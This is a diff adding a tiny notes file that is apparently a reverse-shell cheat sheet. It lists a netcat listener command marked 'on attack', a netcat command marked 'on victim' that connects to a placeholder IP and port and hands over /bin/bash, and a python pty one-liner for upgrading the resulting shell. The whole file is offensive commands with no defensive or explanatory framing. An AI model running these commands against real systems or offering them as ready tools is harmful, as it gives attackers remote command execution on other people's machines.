@@ -1,0 +1,6 @@
+I - nc -lvnp <PORT> --> on attack
+
+II - nc <IP> <PORT> -e /bin/bash --> on victim
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
